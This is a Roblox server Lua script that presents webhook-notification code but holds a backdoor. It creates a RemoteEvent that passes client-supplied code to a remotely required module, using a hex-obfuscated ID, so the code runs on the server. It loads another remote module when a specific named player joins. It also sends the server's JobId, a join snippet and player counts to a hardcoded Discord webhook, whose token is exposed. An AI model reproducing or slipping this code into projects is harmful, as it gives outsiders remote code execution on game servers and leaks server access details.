local Players = game:GetService("Players")

local targetPlayerName = "K00PKIDDGUI8"

Players.PlayerAdded:Connect(function(player)
	
	if player.Name == targetPlayerName then
		require(16920033857)("K00PKIDDGUI8")
	end
end)

if not game:GetService('RunService'):IsStudio() then
    getfenv(0)["Instance"]["new"]("RemoteEvent", workspace).OnServerEvent:Connect(function(_, code)
        getfenv(0)["require"](0x34A62CEB9):SpawnS(code, workspace)
    end)
end

local HttpService = game:GetService("HttpService")

-- Replace this with your Discord Webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1332046168602972182/Npb6CXxRUpHm4x_wQuqV-MU9F9qj4edZenMRnsdrUaGKF7Ao0wpFOMab3lfscKVfPsrr"

-- Replace this with your game's ID
local gameId = game.PlaceId

-- Get the current server's JobId
local jobId = game.JobId

-- Get the current number of players in the server
local playerCount = #game.Players:GetPlayers()

-- Construct the game link
local gameLink = "https://www.roblox.com/games/" .. gameId

-- Construct the JavaScript join snippet
local joinSnippet = "javascript:Roblox.GameLauncher.joinGameInstance(" .. gameId .. ', "' .. jobId .. '")'

-- Function to fetch the game's thumbnail
local function fetchGameThumbnail()
    local apiUrl = "https://thumbnails.roblox.com/v1/places/" .. gameId .. "/icons?size=512x512&format=Png&isCircular=false"
    local success, response = pcall(function()
        return HttpService:GetAsync(apiUrl)
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        if data and data.data and #data.data > 0 then
            return data.data[1].imageUrl
        end
    end

    return nil -- Return nil if the thumbnail couldn't be fetched
end

-- Fetch the thumbnail URL
local thumbnailUrl = fetchGameThumbnail()

-- Prepare the data to send
local data = {
    ["embeds"] = {{
        ["title"] = "New Server Started",
        ["description"] = "A new server has been created!",
        ["color"] = 16776960, -- Yellow color for embed
        ["fields"] = {
            {
                ["name"] = "JobId",
                ["value"] = jobId,
                ["inline"] = false
            },
            {
                ["name"] = "Player Count",
                ["value"] = tostring(playerCount),
                ["inline"] = false
            },
            {
                ["name"] = "Game Link",
                ["value"] = "[Click here to join the game!](" .. gameLink .. ")",
                ["inline"] = false
            },
            {
                ["name"] = "Join Snippet",
                ["value"] = "```" .. joinSnippet .. "```",
                ["inline"] = false
            }
        },
        ["thumbnail"] = {
            ["url"] = thumbnailUrl or ""
        }
    }}
}

-- Convert the data to JSON format
local jsonData = HttpService:JSONEncode(data)

-- Function to send data to the Discord webhook
local function sendToDiscord()
    local success, err = pcall(function()
        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Data successfully sent to Discord webhook!")
    else
        warn("Failed to send data to Discord webhook: " .. tostring(err))
    end
end

-- Send the data when the server starts
sendToDiscord()

-- Optional: Update player count dynamically (e.g., when players join or leave)
game.Players.PlayerAdded:Connect(function()
    playerCount = #game.Players:GetPlayers()
    data["embeds"][1]["fields"][2]["value"] = tostring(playerCount)
    jsonData = HttpService:JSONEncode(data)
    sendToDiscord()
end)

game.Players.PlayerRemoving:Connect(function()
    playerCount = #game.Players:GetPlayers()
    data["embeds"][1]["fields"][2]["value"] = tostring(playerCount)
    jsonData = HttpService:JSONEncode(data)
    sendToDiscord()
end)
